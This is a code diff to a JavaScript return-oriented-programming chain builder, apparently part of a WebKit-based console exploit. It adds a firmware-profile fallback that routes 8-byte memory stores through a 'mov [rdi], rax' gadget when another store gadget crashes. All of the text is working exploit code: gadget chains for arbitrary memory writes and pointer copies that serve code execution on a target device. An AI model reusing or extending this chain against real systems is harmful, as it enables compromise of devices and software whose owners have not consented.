@@ -78,32 +78,66 @@ class rop {
         this.push(this.gadgets["mov [rdi], eax"]);
     }
 
+    // Some profiles have no working `mov [rdi], rsi ; ret`. 7.00's 0x7527F0 is
+    // one: probe=p proved pop rdi and pop rsi are both correct, and probe=w --
+    // the same two pops plus this store -- crashes, so the store is the fault.
+    // Those profiles set OFFSET_wk_store_via_rax and every 8-byte store is
+    // routed through `mov [rdi], rax` instead, which write_result already uses.
+    static storeViaRax() {
+        return (typeof OFFSET_wk_store_via_rax !== "undefined")
+            && OFFSET_wk_store_via_rax;
+    }
+
+    push_store8(dest_already_in_rdi, value) {
+        if (rop.storeViaRax()) {
+            this.push(this.gadgets["pop rax"]);
+            this.push(value);
+            this.push(this.gadgets["mov [rdi], rax"]);
+        } else {
+            this.push(this.gadgets["pop rsi"]);
+            this.push(value);
+            this.push(this.gadgets["mov [rdi], rsi"]);
+        }
+    }
+
     push_write8(dest, value) {
         this.push(this.gadgets["pop rdi"]);
         this.push(dest);
-        this.push(this.gadgets["pop rsi"]);
-        this.push(value);
-        this.push(this.gadgets["mov [rdi], rsi"]);
+        this.push_store8(dest, value);
     }
 
     push_copy8(dest, src) {
         this.push(this.gadgets["pop rax"]);
         this.push(src);
         this.push(this.gadgets["mov rax, [rax]"]);
-        this.push_set_reg_from_rax("rsi");
-        this.push(this.gadgets["pop rdi"]);
-        this.push(dest);
-        this.push(this.gadgets["mov [rdi], rsi"]);
+        if (rop.storeViaRax()) {
+            // value is already in rax -- store it straight out
+            this.push(this.gadgets["pop rdi"]);
+            this.push(dest);
+            this.push(this.gadgets["mov [rdi], rax"]);
+        } else {
+            this.push_set_reg_from_rax("rsi");
+            this.push(this.gadgets["pop rdi"]);
+            this.push(dest);
+            this.push(this.gadgets["mov [rdi], rsi"]);
+        }
     }
 
     push_write_ptr8(dest, value) {
         this.push(this.gadgets["pop rax"]);
         this.push(value);
         this.push(this.gadgets["mov rax, [rax]"]);
-        this.push_set_reg_from_rax("rsi");
-        this.push(this.gadgets["pop rdi"]);
-        this.push(dest);
-        this.push(this.gadgets["mov [rdi], rsi"]);
+        if (rop.storeViaRax()) {
+            // value is already in rax -- store it straight out
+            this.push(this.gadgets["pop rdi"]);
+            this.push(dest);
+            this.push(this.gadgets["mov [rdi], rax"]);
+        } else {
+            this.push_set_reg_from_rax("rsi");
+            this.push(this.gadgets["pop rdi"]);
+            this.push(dest);
+            this.push(this.gadgets["mov [rdi], rsi"]);
+        }
     }
 
     write_result(dest) {
